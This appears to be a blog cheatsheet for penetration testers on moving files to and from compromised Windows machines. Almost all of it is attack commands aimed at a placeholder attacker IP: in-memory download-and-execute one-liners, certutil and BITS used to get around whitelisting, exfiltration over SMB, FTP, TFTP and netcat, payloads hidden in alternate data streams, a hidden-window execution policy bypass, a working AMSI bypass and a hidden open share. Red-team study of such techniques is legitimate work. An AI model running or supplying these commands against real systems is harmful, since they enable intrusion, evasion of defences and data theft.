---
layout: post
title: Windows File Transfer Cheatsheet
date: 2025-04-10 16:36 +0300
categories: [Windows]
tags: [file transfer, windows, powershell]
---

## PowerShell HTTP Transfers

### Download Files
```powershell
# Basic file download
Invoke-WebRequest -Uri "http://10.10.10.1:8000/payload.exe" -OutFile "C:\Windows\Temp\payload.exe"

# Download with System.Net.WebClient (PowerShell 2.0 compatible)
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.1:8000/payload.exe", "C:\Windows\Temp\payload.exe")

# Download and execute in memory
Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://10.10.10.1:8000/script.ps1")
IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.1:8000/script.ps1")

# Download with progress bar
Invoke-WebRequest -Uri "http://10.10.10.1:8000/large_file.exe" -OutFile "C:\Windows\Temp\large_file.exe" -UseBasicParsing

# With authentication
$cred = Get-Credential
Invoke-WebRequest -Uri "http://10.10.10.1:8000/payload.exe" -OutFile "C:\Windows\Temp\payload.exe" -Credential $cred
```

### Upload Files
```powershell
# Using PowerShell and Invoke-WebRequest POST
Invoke-RestMethod -Uri "http://10.10.10.1:8000/upload" -Method Post -InFile "C:\Windows\Temp\data.txt"

# Multipart form upload
$filePath = "C:\Windows\Temp\data.txt"
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$contentType = "multipart/form-data; boundary=`"$boundary`""
$body = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $filePath -Leaf)`"",
    "Content-Type: application/octet-stream$LF",
    [System.IO.File]::ReadAllText($filePath),
    "--$boundary--$LF"
) -join $LF
Invoke-RestMethod -Uri "http://10.10.10.1:8000/upload" -Method Post -ContentType $contentType -Body $body
```

## CertUtil Transfers

```
:: Download file using certutil (often bypasses application whitelisting)
certutil -urlcache -split -f "http://10.10.10.1:8000/payload.exe" payload.exe

:: Alternative download method
certutil -urlcache -f "http://10.10.10.1:8000/payload.exe" payload.exe

:: Encode/decode for file transfer
:: On attacker machine: 
certutil -encode payload.exe payload.txt

:: On target machine:
certutil -decode payload.txt payload.exe
```

## BITS Transfers

```
:: Start BITS transfer job
bitsadmin /transfer myJob /download /priority high "http://10.10.10.1:8000/payload.exe" "C:\Windows\Temp\payload.exe"

:: PowerShell BITS transfer
Start-BitsTransfer -Source "http://10.10.10.1:8000/payload.exe" -Destination "C:\Windows\Temp\payload.exe"

:: BITS transfer with authentication
Start-BitsTransfer -Source "http://10.10.10.1:8000/payload.exe" -Destination "C:\Windows\Temp\payload.exe" -Authentication NTLM -Credential $cred
```

## SMB Transfers

### Mount SMB Share
```
:: Mount drive
net use Z: \\10.10.10.1\share /user:username password

:: Copy files
copy Z:\payload.exe C:\Windows\Temp\payload.exe
copy C:\Windows\Temp\data.txt Z:\exfil\
```

### PowerShell SMB Access
```powershell
# Copy from SMB share
Copy-Item -Path "\\10.10.10.1\share\payload.exe" -Destination "C:\Windows\Temp\payload.exe"

# Copy to SMB share
Copy-Item -Path "C:\Windows\Temp\data.txt" -Destination "\\10.10.10.1\share\exfil\"
```

### Create SMB Server (Impacket on Attacker)
```bash
# Create SMB server on attacker machine
impacket-smbserver share -smb2support /path/to/files
```

## FTP Transfers

### Command Line FTP
```
:: Create FTP script
echo open 10.10.10.1 21 > ftp.txt
echo user anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get payload.exe >> ftp.txt
echo bye >> ftp.txt

:: Run FTP with script
ftp -s:ftp.txt
```

### PowerShell FTP
```powershell
# FTP upload with PowerShell
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous")
$client.UploadFile("ftp://10.10.10.1/upload/data.txt", "C:\Windows\Temp\data.txt")

# FTP download with PowerShell
$client.DownloadFile("ftp://10.10.10.1/payload.exe", "C:\Windows\Temp\payload.exe")
```

## TFTP Transfers (Windows 7/Server 2008)

```
:: Install TFTP client if needed
pkgmgr /iu:"TFTP"

:: Download file
tftp -i 10.10.10.1 GET payload.exe

:: Upload file
tftp -i 10.10.10.1 PUT C:\Windows\Temp\data.txt
```

## Base64 Encoding/Decoding

```powershell
# PowerShell - Encode file to Base64
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\Temp\data.exe")) | Out-File -Encoding ASCII data.b64

# PowerShell - Decode Base64 to file
$content = Get-Content -Path "data.b64"
[System.IO.File]::WriteAllBytes("C:\Windows\Temp\data.exe", [Convert]::FromBase64String($content))
```

## Alternate Data Streams

```powershell
# Store data in alternate stream
Set-Content -Path "C:\Windows\Temp\legit.txt:payload.exe" -Value (Get-Content -Path "C:\Windows\Temp\payload.exe" -Raw)

# Extract data from alternate stream
Get-Content -Path "C:\Windows\Temp\legit.txt:payload.exe" -Raw > "C:\Windows\Temp\payload.exe"
```

## JavaScript/VBScript Download

```js
// Save as download.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", "http://10.10.10.1:8000/payload.exe", false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("C:\\Windows\\Temp\\payload.exe");

// Execute with: cscript download.js
```

## Debug.exe Binary Transfer (Legacy Systems)

```
# For small files on very old systems
# On attacker machine, create a debug script:
echo n payload.exe > script.txt
echo e 0100 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 >> script.txt
echo e 0110 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 >> script.txt
echo rcx >> script.txt
echo 10000 >> script.txt
echo w >> script.txt
echo q >> script.txt

# On target machine:
debug < script.txt
```

## Windows Command Line Tricks

```
:: Using Powershell from cmd.exe when PowerShell is blocked
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.1:8000/script.ps1') | powershell -

:: Simple VBS downloader
echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):o.Open"GET","http://10.10.10.1:8000/payload.exe",0:o.Send^(^):If o.Status=200 Then:a.Open:a.Type=1:a.Write o.ResponseBody:a.SaveToFile"payload.exe",2 > dl.vbs
cscript dl.vbs
```

## Bypass Techniques

### PowerShell Execution Policy Bypass
```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1

# One-liner bypass
powershell -ep bypass -NoP -NonI -W Hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://10.10.10.1:8000/script.ps1'))"
```

### AMSI Bypass
```powershell
# Simple AMSI bypass (use with caution, often detected)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Proxy-Aware Transfers

```powershell
# Set proxy for PowerShell
$proxy = New-Object System.Net.WebProxy("http://proxy.example.com:8080")
$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$webClient = New-Object System.Net.WebClient
$webClient.Proxy = $proxy
$webClient.DownloadFile("http://10.10.10.1:8000/payload.exe", "C:\Windows\Temp\payload.exe")
```

## RDP File Transfer

```
# Copy and Paste
# Enable clipboard sharing in your RDP client
# Copy file on local machine
# Paste in RDP session

# RDP Drive Sharing
# In mstsc.exe, go to Local Resources > More > Drives and select your drive
# Access it from \\tsclient\C
```

## Post-Exploitation Tools

### NetCat for Windows
```
:: Receive file
nc.exe -lvp 4444 > received_file.exe

:: Send file
nc.exe 10.10.10.1 4444 < C:\Windows\Temp\data.txt
```

### Remote shares for exfiltration
```powershell
# Create hidden share for exfiltration
New-SmbShare -Name "hidden$" -Path "C:\ExfilData" -FullAccess "Everyone"
```

## Quick Reference - Windows Method by Situation

- **Most reliable**: PowerShell Invoke-WebRequest, SMB transfers
- **Most stealthy**: Alternate Data Streams, Base64 encoding
- **Bypass application whitelisting**: Certutil, BITS transfers
- **Legacy systems**: Debug.exe method, VBScript downloaders
- **No direct internet**: Use proxy settings or RDP file transfer
- **Large files**: SMB or BITS transfers with resume capability
- **Automation**: PowerShell scripts with error handling
- **Air-gapped systems**: Base64 encoding or RDP clipboard

